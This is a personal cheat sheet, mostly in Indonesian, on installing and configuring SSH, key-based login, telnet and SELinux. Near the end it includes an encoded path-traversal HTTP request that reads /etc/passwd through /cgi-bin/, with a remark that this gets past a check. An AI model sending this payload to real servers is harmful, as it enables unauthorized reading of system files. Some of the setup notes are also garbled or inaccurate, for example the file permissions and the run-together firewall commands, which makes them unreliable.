# ssh :22

SSH adalah Secure Shell, yaitu sebuah protokol yang memungkinkan kamu untuk mengontrol perangkat, termasuk mengakses dan memodifikasi beragam pengaturan file yang ada dalam server dalam jarak jauh.

## ubuntu, redhat, termux
- install ssh
  - ```apt install openssh-server```

- konfigurasi ssh /etc/ssh/
  - ```nano /etc/ssh/sshd_config```
    ```sh
    port 22
    ```

- start ssh
  - ```systemctl restart ssh or /etc/init.d/ssh restart```
  - ```systemctl status/start/stop/enable/disable ssh```

- host windows / termux
  - ```ssh user@192.168.1.1 -p 22```
  - ```ssh user@192.168.1.1 -x "ls; pwd; cd /home/ariafatah; mkdir test"```

# remote with keygen
- make ssh keygen
  ```
  ssh-keygen -t rsa
  scp path_to_path/.ssh/id.rsa.pub user@server:/home/user/.ssh/authorized_keys
  scp path_to_path/.ssh/id.rsa.pub user@server:/home/user/.ssh/windows.keys
  ```
- authorized keys
  - cd /etc/ssh/sshd.conf
  - and add this
  ```
  AuthorizedKeysFile  /home/ariafatah/.ssh/windows.keys
  ```
  - systemctl restart sshd

- server / client
  - make keygen
    - ```ssh-keygen```
    - ```ssh-keygen -t RSA / -t DSA / -t ECDSA``` (opsional)
  - add file and put pass every login
    - Enter file in which to save the key (/root/.ssh/id_rsa): (u can enter or add path manual)
    - Enter passphrase (empty for no passphrase): (opsional)
  - cheeck key
    ```
    Your identification has been saved in /root/.ssh/id_rsa
    Your public key has been saved in /root/.ssh/id_rsa.pub
    ```
    - ```cat /root/.ssh/id_rsa.pub```
      - and copy key and put to authorized_keys
      - and u can use in client
- client
    - ```scp C:\Users\ariaf\.ssh\id_rsa.pub ariafatah@192.168.1.1:/home/ariafatah/.ssh/authorized_keys```
    - ```ssh-copy-id -i /root/.ssh/id_rsa.pub user@<destination_ip>```
    - ```ssh-copy-id -i /lokasi/ke/kunci.pub user@server```
    - ```ssh -i user_cert user@server_address```


inget id_rsa yang dikirim pub
lalu untuk fileyang di .ssh/authorized_keys nya harus 700 dan harus milih user
  
- server
  - jika ingin sshnya hanya bisa di akses lewat id_rsa
  - bisa tambahkan aturan di /etc/ssh/sshd_conf
    ```
    PasswordAuthentication no
    ```

    sudo firewall-cmd --add-port=1026/tcp --permanent successsudo firewall-cmd --remove-service=ssh --permanent success

# telnet :23

Perbedaan Utama Antara Telnet dan SSH Telnet tidak menyediakan autentikasi, sedangkan SSH mengautentikasi penerima. Jaringan pribadi berfungsi dengan Telnet, sedangkan SSH beroperasi pada jaringan bersama. Telnet berinteraksi melalui TCP/IP melalui nomor port 23, sedangkan SSH menggunakan nomor port 22 untuk komunikasi.

- install ssh
  - ```apt install telnet```

- host windows / termux
  - ```telnet 192.168.1.1```




sestatus #untuk cek status selinux
# mengaktidkan selinux
- setenforce 1
  atau
- nano /etc/selinux/config > SELINUX=enforcing


- karakter dot kedua dienkripsi sebagai %2e, “…/” berubah menjadi “.%2e/” dan berhasil melewati pemeriksaan.
- GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: 127.0.0.1:8080


ssh -OPTIONS -p SSH_PORT user@remote_server "remote_command1; remote_command2; remote_script.sh"